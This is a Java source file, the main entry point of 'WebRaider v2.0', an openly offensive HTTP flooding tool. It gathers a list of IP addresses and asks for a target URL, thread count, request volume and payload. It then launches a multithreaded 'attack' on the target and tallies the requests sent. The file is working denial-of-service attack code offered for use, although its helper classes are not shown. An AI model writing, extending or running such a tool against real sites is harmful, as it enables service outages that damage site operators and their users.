package com.webraider.master;

import com.webraider.master.style.ASCIIArt;
import com.webraider.master.style.ConsoleColor;
import com.webraider.master.util.InputHandler;
import com.webraider.master.util.IpFetcher;
import com.webraider.master.util.ThreadManager;

import java.util.List;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicInteger;

/**
 *
 *@author Sma1lo
 */

public class WebRaider {
    public static void main(String[] args) {
        try {
            System.out.println(ConsoleColor.YELLOW + "[WARN]" + ConsoleColor.RESET + " Fetching IP addresses...");
            List<String> ipList = IpFetcher.getIpList();
            System.out.println(ConsoleColor.GREEN + "[INFO]" + ConsoleColor.RESET + " Collected " + ipList.size() + " IP addresses.");
            Scanner scanner = new Scanner(System.in);

            while (true) {
                System.out.println(ASCIIArt.WEBRAIDER);
                System.out.println(ConsoleColor.RED + "       ===" + ConsoleColor.RESET + " WebRaider " + ConsoleColor.RED + "v2.0 -" + ConsoleColor.RESET + " Enhanced Edition " + ConsoleColor.RED + "===" + ConsoleColor.RESET);
                System.out.println("\t\t    Author: " + ConsoleColor.RED + "Sma1lo" + ConsoleColor.RESET);
                System.out.println(ConsoleColor.RED + "       =========================================" + ConsoleColor.RESET);
                System.out.println("\n[" + ConsoleColor.RED + 1 + ConsoleColor.RESET + "]" + ConsoleColor.RED + " Start WebRaider" + ConsoleColor.RESET);
                System.out.println("[" + ConsoleColor.RED + 0 + ConsoleColor.RESET + "]" + ConsoleColor.RED + " Exit" + ConsoleColor.RESET);
                System.out.print("\nEnter number: ");
                String command = scanner.nextLine().trim();

                if (command.equals("0")) {
                    System.out.println(ConsoleColor.GREEN + "[INFO] " + ConsoleColor.RESET + " Exiting WebRaider.");
                    break;
                } else if (command.equals("1")) {
                    InputHandler inputHandler = new InputHandler();
                    inputHandler.handleInput();

                    String targetUrl = inputHandler.getTargetUrl();
                    int numThreads = inputHandler.getNumThreads();
                    int requestsPerThread = inputHandler.getRequestsPerThread();
                    int delayMs = inputHandler.getDelayMs();
                    String method = inputHandler.getMethod();
                    String body = inputHandler.getBody();

                    AtomicInteger sent = new AtomicInteger(0);
                    AtomicInteger success = new AtomicInteger(0);
                    AtomicInteger failed = new AtomicInteger(0);

                    int totalRequests = numThreads * requestsPerThread;
                    System.out.println(ConsoleColor.YELLOW + "[WARN]" + ConsoleColor.RESET + " Starting attack on " + targetUrl + " with " + totalRequests + " requests...");
                    long startTime = System.currentTimeMillis();

                    ThreadManager.executeMultiThreadedRequests(targetUrl, numThreads, requestsPerThread, method, body, ipList, sent, success, failed, delayMs);

                    long endTime = System.currentTimeMillis();
                    System.out.println(ConsoleColor.GREEN + "[INFO]" + ConsoleColor.RESET + " Attack completed in " + (endTime - startTime) / 1000.0 + " seconds.");
                    System.out.println(ConsoleColor.GREEN + "[INFO]" + ConsoleColor.RESET + " Sent: " + sent.get() + " | Successful: " + success.get() + " | Failed: " + failed.get());
                } else {
                    System.out.println(ConsoleColor.RED + "[ERROR]" + ConsoleColor.RESET + " Unknown command. Use '1' to start or '0' to exit.");
                }
            }

            scanner.close();
        } catch (Exception e) {
            System.err.println(ConsoleColor.RED + "[ERROR] " + ConsoleColor.RESET + e.getMessage());
        }
    }
}
